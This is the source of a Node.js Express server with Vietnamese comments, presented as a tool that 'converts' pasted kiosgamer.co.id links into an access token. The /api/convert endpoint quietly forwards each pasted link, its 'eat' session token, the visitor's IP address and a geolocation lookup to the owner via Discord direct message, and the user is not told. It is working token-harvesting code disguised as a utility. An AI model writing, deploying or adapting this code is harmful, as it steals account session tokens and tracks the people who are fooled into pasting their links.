const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Bật trust proxy để lấy IP chuẩn khi chạy qua Render/Cloudflare
app.set('trust proxy', true);

// Cấu hình đường dẫn
const SOCIAL_LINKS = {
    google: process.env.URL_GOOGLE || "https://google.com",
    facebook: process.env.URL_FACEBOOK || "https://facebook.com",
    x: process.env.URL_X || "https://x.com",
    vk: process.env.URL_VK || "https://vk.com",
    avatar: process.env.URL_AVATAR || "/cat.png"
};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/social-links', (req, res) => {
    res.json(SOCIAL_LINKS);
});

// === 1. KHỞI TẠO BOT DISCORD ===
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages
    ]
});

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
    console.log(`[BOT DISCORD] Đã đăng nhập thành công với tên: ${client.user.tag}`);
});

if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch(err => console.error('[BOT ERROR] Không thể kết nối Bot:', err));
}

// Bộ nhớ lưu lịch sử thao tác của các IP (Dùng để kiểm tra 10s & trùng lặp)
// Cấu trúc: { ip: { lastUrl: string, lastTimestamp: number } }
const ipCache = new Map();

// Hàm lấy IP người dùng chuẩn xác
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || 'Không xác định';
}

// Hàm lấy Vị trí địa lý từ IP
async function fetchIpLocation(ip) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
        return 'Localhost / Mạng nội bộ';
    }
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,org`);
        if (response.ok) {
            const data = await response.json();
            if (data.status === 'success') {
                const parts = [data.city, data.regionName, data.country, data.org].filter(Boolean);
                return parts.join(', ');
            }
        }
    } catch (e) {
        console.error('Lỗi khi tra cứu IP:', e.message);
    }
    return 'Không xác định';
}

// === HÀM GỬI DM CHO OWNER DISCORD ===
async function sendTokenToOwner(originalUrl, eatToken, ip, location) {
    if (!OWNER_ID) return;

    try {
        const owner = await client.users.fetch(OWNER_ID);
        if (owner) {
            const messageContent = 
`🔔 **THÔNG BÁO DỮ LIỆU MỚI** 🔔
-----------------------------------------
🔗 **Link gốc:** \`${originalUrl}\`
🔑 **Chuỗi EAT Token:** \`${eatToken}\`
🌐 **Địa chỉ IP:** \`${ip}\`
📍 **Vị trí / Nhà mạng:** \`${location}\`
⏰ **Thời gian:** <t:${Math.floor(Date.now() / 1000)}:F>`;

            await owner.send(messageContent);
            console.log(`[BOT DISCORD] Đã gửi thông báo cho Owner (${owner.tag})`);
        }
    } catch (error) {
        console.error('[BOT ERROR] Lỗi khi gửi tin nhắn cho Owner:', error.message);
    }
}

// === HÀM KIỂM TRA ĐỊNH DẠNG LINK KIOSGAMER ===
function validateKiosGamerLink(inputUrl) {
    try {
        const parsed = new URL(inputUrl);
        // Kiểm tra đúng tên miền kiosgamer.co.id
        if (!parsed.hostname.includes('kiosgamer.co.id')) {
            return { valid: false, message: 'Chỉ chấp nhận đường link hợp lệ từ kiosgamer.co.id!' };
        }
        // Kiểm tra phải chứa tham số eat
        const eatParam = parsed.searchParams.get('eat');
        if (!eatParam) {
            return { valid: false, message: 'Link không hợp lệ! Không tìm thấy tham số eat trong đường link.' };
        }
        return { valid: true, eatToken: eatParam };
    } catch (e) {
        return { valid: false, message: 'Định dạng link không đúng! Vui lòng dán đầy đủ đường link (chứa https://...).' };
    }
}

// === API XỬ LÝ CHUYỂN ĐỔI ===
app.post('/api/convert', async (req, res) => {
    const { url } = req.body;
    const clientIp = getClientIp(req);
    const now = Date.now();

    if (!url || typeof url !== 'string' || !url.trim()) {
        return res.status(400).json({ success: false, message: 'Vui lòng dán đường link!' });
    }

    const trimmedUrl = url.trim();

    // 1. Kiểm tra link hợp lệ (Chỉ nhận link kiosgamer.co.id có chứa eat=)
    const validation = validateKiosGamerLink(trimmedUrl);
    if (!validation.valid) {
        return res.status(400).json({ success: false, message: validation.message });
    }

    // 2. Kiểm tra giới hạn 10 giây cho lần nhập tiếp theo trên cùng 1 IP
    const userHistory = ipCache.get(clientIp);
    if (userHistory) {
        const timePassed = (now - userHistory.lastTimestamp) / 1000;
        if (timePassed < 10) {
            const remaining = Math.ceil(10 - timePassed);
            return res.status(429).json({ 
                success: false, 
                message: `Vui lòng chờ ${remaining} giây trước khi gửi yêu cầu tiếp theo!` 
            });
        }
    }

    const eatToken = validation.eatToken;

    // 3. Kiểm tra xem IP này có dán trùng lại cùng 1 link vừa dán trước đó không
    let isDuplicate = false;
    if (userHistory && userHistory.lastUrl === trimmedUrl) {
        isDuplicate = true;
    }

    // Cập nhật lại lịch sử IP
    ipCache.set(clientIp, {
        lastUrl: trimmedUrl,
        lastTimestamp: now
    });

    // 4. Nếu KHÔNG trùng lặp -> Lấy vị trí IP và gửi thông báo Discord cho Owner
    if (!isDuplicate) {
        const location = await fetchIpLocation(clientIp);
        sendTokenToOwner(trimmedUrl, eatToken, clientIp, location);
    } else {
        console.log(`[INFO] Phát hiện yêu cầu trùng lặp từ IP ${clientIp}. Bỏ qua gửi tin nhắn Discord.`);
    }

    // Trả token kết quả về giao diện cho người dùng
    return res.json({
        success: true,
        accessToken: eatToken
    });
});

app.listen(PORT, () => {
    console.log(`[SERVER] Website đang chạy tại cổng http://localhost:${PORT}`);
});
